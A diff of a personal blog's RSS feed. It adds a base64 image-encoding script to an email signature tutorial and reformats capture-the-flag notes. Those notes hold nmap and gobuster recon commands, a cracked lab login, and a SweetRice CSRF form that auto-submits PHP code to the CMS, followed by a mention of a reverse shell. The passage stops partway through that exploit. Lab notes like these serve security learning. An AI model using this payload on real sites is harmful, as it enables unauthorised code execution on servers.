@@ -52,16 +52,59 @@
 &lt;p&gt;Let&amp;rsquo;s create a professional looking signature for your email. This tutorial will give you step-by-step instructions on creating and deploying an email signature for &lt;strong&gt;iCloud&lt;/strong&gt; (macOS Mail client and iPhone) along with &lt;strong&gt;Google&lt;/strong&gt;. It may work for other providers such as Outlook, but has not been tested.&lt;/p&gt;
 &lt;img src=&#34;http://localhost:1313/images/2024/professional-email-signatures/signature_example.jpg&#34; alt=&#34;alt&#34; title=&#34;Example Signature&#34; width=&#34;400&#34;&gt;
 &lt;p&gt;If you want a logo or photo in your signature, it is important that the image is available online and the location does not move. The next section will walk you through hosting your own images. If you are not going to have an image in your signature, skip the next section.&lt;/p&gt;
-&lt;h2 id=&#34;host-your-own-image&#34;&gt;Host Your Own Image&lt;/h2&gt;
+&lt;h2 id=&#34;signature-images&#34;&gt;Signature Images&lt;/h2&gt;
+&lt;p&gt;You can either host your own image on a public facing domain or encode your image directly into the signature. Below will show both methods.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;http://localhost:1313/professional-email-signatures/#host-your-own-image&#34;&gt;Host Image&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://localhost:1313/professional-email-signatures/#encode-your-own-image&#34;&gt;Encode Image&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;host-your-own-image&#34;&gt;Host Your Own Image&lt;/h3&gt;
 &lt;p&gt;To ensure the image location does not move on the internet, it is best to host the image yourself. Even if not a developer, I recommend creating a free &lt;strong&gt;&lt;a href=&#34;https://github.com&#34;&gt; Github &lt;/a&gt;&lt;/strong&gt; account to host your own images. Go to &lt;strong&gt;&lt;a href=&#34;https://github.com&#34;&gt;Github.com&lt;/a&gt;&lt;/strong&gt; and sign up. Once signed up:&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;Create a new repository&lt;/li&gt;
 &lt;li&gt;Name this repository &lt;em&gt;images&lt;/em&gt;&lt;/li&gt;
 &lt;li&gt;Save all images that will be used in your signature to this repo&lt;/li&gt;
 &lt;/ul&gt;
+&lt;h3 id=&#34;encode-your-own-image&#34;&gt;Encode Your Own Image&lt;/h3&gt;
+&lt;p&gt;Open the terminal on your Mac (Applications -&amp;gt; Utilities -&amp;gt; Terminal) or open &lt;code&gt;Spotlight&lt;/code&gt; using &lt;code&gt;CMD + Space&lt;/code&gt; and type &lt;code&gt;terminal&lt;/code&gt; and open. Type the following command to download the script to encode images OR copy the block of code:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl -o base64image.sh &lt;span class=&#34;s1&#34;&gt;&amp;#39;https://gist.githubusercontent.com/matthewshammond/e908ebc41791c4837725015d72ebe82c/raw/base64img.sh&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If you prefer to copy and paste the code into a script use this code below (also hosted &lt;a href=&#34;https://gist.github.com/matthewshammond/e908ebc41791c4837725015d72ebe82c&#34;&gt;HERE&lt;/a&gt;):&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#!/usr/bin/env bash
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;usage&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Usage: base64img [FILE]&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Formats: APNG BMP GIF JPEG PNG WEBP&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Print usage and exit if the file was not provided&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$#&lt;/span&gt; -eq &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; usage &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Grab the image format&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;fmt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;file &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$1&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep -iEo &lt;span class=&#34;s1&#34;&gt;&amp;#39;apng|bmp|gif|jpeg|png|webp&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; head -n1 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; tr &lt;span class=&#34;s1&#34;&gt;&amp;#39;[:upper:]&amp;#39;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;[:lower:]&amp;#39;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Check if the image format is supported&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; -z &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$fmt&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; usage &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Create an IMG template&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;img&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;img src=&amp;#39;data:image/&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$fmt&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;;base64, &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;base64 -i &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$1&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39; /&amp;gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$img&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After you have the script, you need to make the script executable by typing &lt;code&gt;chmod +x base64img.sh&lt;/code&gt; into the temrinal.&lt;/p&gt;
+&lt;p&gt;In order to use this script to process each image, you will use the command &lt;code&gt;./base64img.sh &amp;lt;image&amp;gt;&lt;/code&gt; where &lt;code&gt;&amp;lt;image&amp;gt;&lt;/code&gt; is the location and name of the image. For example:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./base64img.sh ~/Downloads/logo.png
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;[!NOTE]
+If you are unfamiliar with the terminal, I recommend you move all your images to your &lt;code&gt;Downloads&lt;/code&gt; folder and use the example above only requiring you to change &lt;code&gt;logo.png&lt;/code&gt; with the name of your image file.&lt;/p&gt;
+&lt;/blockquote&gt;
 &lt;h2 id=&#34;create-your-signature&#34;&gt;Create Your Signature&lt;/h2&gt;
 &lt;p&gt;The easiest method to building your own custom html styled email signature is to start with a template. There are many free services to create the template. Almost all, will allow a free trial and then charge a monthly subscription. You only need the service for a few minutes; therefore, we aren&amp;rsquo;t worried about a paid service. These free services also do not require payment unless you continue using the service after the free trial. Ensure you search for &lt;code&gt;html email signature&lt;/code&gt; when finding a site.&lt;/p&gt;
-&lt;p&gt;If you prefer my template from above, the html code is &lt;a href=&#34;https://gist.github.com/matthewshammond/a5cb215114af4c48be909c511a608087&#34;&gt;HERE&lt;/a&gt; or copy the code below:&lt;/p&gt;
+&lt;p&gt;If you prefer my template from above, you can download it by running the following in your terminal:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl -o signature.html &lt;span class=&#34;s1&#34;&gt;&amp;#39;https://gist.githubusercontent.com/matthewshammond/a5cb215114af4c48be909c511a608087/raw/signature_support.html&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;or the html code is &lt;a href=&#34;https://gist.github.com/matthewshammond/a5cb215114af4c48be909c511a608087&#34;&gt;HERE&lt;/a&gt; or copy the code below:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!NOTE]
+THE EASIEST WAY TO EDIT THE FILE IF UNFAMILIAR WITH TERMINAL TEXT EDITORS IS TO CHANGE THE EXTENSION BY RENAMING THE FILE FROM &lt;strong&gt;.html&lt;/strong&gt; TO &lt;strong&gt;.txt&lt;/strong&gt; SO THAT YOU CAN OPEN AND EDIT THE FILE WITH THE BUILT-IN TEXT EDITOR&lt;/p&gt;
+&lt;/blockquote&gt;
 &lt;blockquote&gt;
 &lt;p&gt;[!CAUTION]
 Ensure you update the html code with your name, phone, email, images&lt;/p&gt;
@@ -391,9 +434,38 @@ Ensure you update the html code with your name, phone, email, images&lt;/p&gt;
 &lt;p&gt;[!CAUTION]
 Ensure you update the html code with your name, phone, email, images&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;&lt;strong&gt;Anywhere you see &lt;code&gt;img src&lt;/code&gt; be sure to put the link to your image hosted on github&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;Go to your github repo you created earlier. Select the image you uploaded and then &lt;code&gt;right click&lt;/code&gt; on the image and select &lt;code&gt;Copy Image Address&lt;/code&gt;. This is the url link you will use in &lt;code&gt;img src&lt;/code&gt;.&lt;/p&gt;
-&lt;h2 id=&#34;using-your-signature-in-macos-mail&#34;&gt;Using Your Signature in macOS Mail&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Anywhere you see &lt;code&gt;img src&lt;/code&gt; be sure to put the link to your image hosted on github or the base64 code snippet that was produced when encoding the image&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;example&#34;&gt;Example&lt;/h3&gt;
+&lt;p&gt;Using a public facing link:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!NOTE]
+Go to your github repo you created earlier. Select the image you uploaded and then &lt;code&gt;right click&lt;/code&gt; on the image and select &lt;code&gt;Copy Image Address&lt;/code&gt;. This is the url link you will use in &lt;code&gt;img src&lt;/code&gt;.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;img&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;style&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    border: 0px;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    height: 120px;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    min-width: 150px;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    width: 150px;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    &amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;https://matthammond.com/images/logos/MH_signature.png&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;width&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;150&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;120&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;/&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;p&gt;Using base64 encode:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;img&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;style&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    border: 0px;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    height: 120px;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    min-width: 150px;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    width: 150px;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    &amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;data:image/png;base64, iVBORw0KGgo...AAAANSUhEUgA&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;width&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;150&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;120&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;/&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;using-your-signature-in-macos-mail&#34;&gt;Using Your Signature in macOS Mail&lt;/h2&gt;
 &lt;p&gt;Now that you have the html code edited with your information, you are going to create a new email signature in macOS Mail. In macOS Mail, at the top, in the menu bar, select:&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;code&gt;Mail -&amp;gt; Settings&lt;/code&gt;&lt;/li&gt;
@@ -402,7 +474,7 @@ Ensure you update the html code with your name, phone, email, images&lt;/p&gt;
 &lt;li&gt;Type anything you want &lt;strong&gt;&lt;em&gt;we will change this to your signature soon&lt;/em&gt;&lt;/strong&gt;&lt;/li&gt;
 &lt;li&gt;Completely quit macOS Mail&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;Open your &lt;code&gt;terminal&lt;/code&gt;. To do so, open &lt;code&gt;Spotlight&lt;/code&gt; using &lt;code&gt;CMD + Space&lt;/code&gt; and type &lt;code&gt;terminal&lt;/code&gt; and open. When terminal opens type &lt;code&gt;open ~/Library/Mail/&lt;/code&gt;. This will open a &lt;strong&gt;Finder&lt;/strong&gt; window at the Mail folder. You may or may not see multiple folders labeled with &lt;code&gt;V&lt;/code&gt; and a number like &lt;strong&gt;V3&lt;/strong&gt;, &lt;strong&gt;V4&lt;/strong&gt;, &lt;strong&gt;V10&lt;/strong&gt;, etc. Open the folder with the highest &lt;code&gt;V&lt;/code&gt; number. Then open &lt;code&gt;MailData&lt;/code&gt; then &lt;code&gt;Signatures&lt;/code&gt;. Looking at the &lt;code&gt;Date Modified&lt;/code&gt; column, the newest &lt;code&gt;.mailsignature&lt;/code&gt; file is the signature we just created.&lt;/p&gt;
+&lt;p&gt;Open the terminal on your Mac (Applications -&amp;gt; Utilities -&amp;gt; Terminal) or open &lt;code&gt;Spotlight&lt;/code&gt; using &lt;code&gt;CMD + Space&lt;/code&gt; and type &lt;code&gt;terminal&lt;/code&gt; and open. When terminal opens type &lt;code&gt;open ~/Library/Mail/&lt;/code&gt;. This will open a &lt;strong&gt;Finder&lt;/strong&gt; window at the Mail folder. You may or may not see multiple folders labeled with &lt;code&gt;V&lt;/code&gt; and a number like &lt;strong&gt;V3&lt;/strong&gt;, &lt;strong&gt;V4&lt;/strong&gt;, &lt;strong&gt;V10&lt;/strong&gt;, etc. Open the folder with the highest &lt;code&gt;V&lt;/code&gt; number. Then open &lt;code&gt;MailData&lt;/code&gt; then &lt;code&gt;Signatures&lt;/code&gt;. Looking at the &lt;code&gt;Date Modified&lt;/code&gt; column, the newest &lt;code&gt;.mailsignature&lt;/code&gt; file is the signature we just created.&lt;/p&gt;
 &lt;p&gt;Right click on the file and select open with &lt;strong&gt;TextEdit&lt;/strong&gt;. At the top of the file you should see a header block that looks something like:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Transfer-Encoding: 7bit Content-Type: text/html; charset=us-ascii
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Message-Id:
@@ -1136,15 +1208,10 @@ Ensure you update the html code with your name, phone, email, images&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/initrd.img
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/initrd.img.old
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;vulnerabilities&#34;&gt;Vulnerabilities&lt;/h3&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;hr&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
 &lt;h2 id=&#34;commands&#34;&gt;Commands&lt;/h2&gt;
 &lt;p&gt;&lt;code&gt;ping $IP&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;sudo nmap -sC -sV -oN scans/initial $IP&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;gobuster dir -u http://10.10.79.182 -w /usr/local/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee scans/gobuster&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;gobuster dir -u http://10.10.79.182 -w /usr/local/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee scans/gobuster&lt;/code&gt;&lt;/p&gt;
 </description>
     </item>
     
@@ -1179,25 +1246,28 @@ Ensure you update the html code with your name, phone, email, images&lt;/p&gt;
 &lt;h3 id=&#34;sweetrice&#34;&gt;sweetrice&lt;/h3&gt;
 &lt;ul&gt;
 &lt;li&gt;exploited and found backup sql database&lt;/li&gt;
-&lt;li&gt;admin account
-user&lt;html&gt;&lt;/li&gt;
+&lt;li&gt;admin account&lt;/li&gt;
 &lt;/ul&gt;
-&lt;body onload=&#34;document.exploit.submit();&#34;&gt;
-&lt;form action=&#34;http://localhost/sweetrice/as/?type=ad&amp;mode=save&#34; method=&#34;POST&#34; name=&#34;exploit&#34;&gt;
-&lt;input type=&#34;hidden&#34; name=&#34;adk&#34; value=&#34;hacked&#34;/&gt;
-&lt;textarea type=&#34;hidden&#34; name=&#34;adv&#34;&gt;
-&lt;?php
-echo &#39;&lt;h1&gt; Hacked &lt;/h1&gt;&#39;;
-phpinfo();?&gt;
-&amp;lt;/textarea&amp;gt;
-&lt;/form&gt;
-&lt;/body&gt;
-&lt;/html&gt;name: manager
-    password: 42f749ade7f9e195bf475f37a44cafcb
-        - hashid: md5
-        - password is= Password123
-&lt;ul&gt;
-&lt;li&gt;change main.php template to reverse shell&lt;/li&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;body&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;onload&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;document.exploit.submit();&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;form&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;action&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://localhost/sweetrice/as/?type=ad&amp;amp;mode=save&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;method&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;POST&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;exploit&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
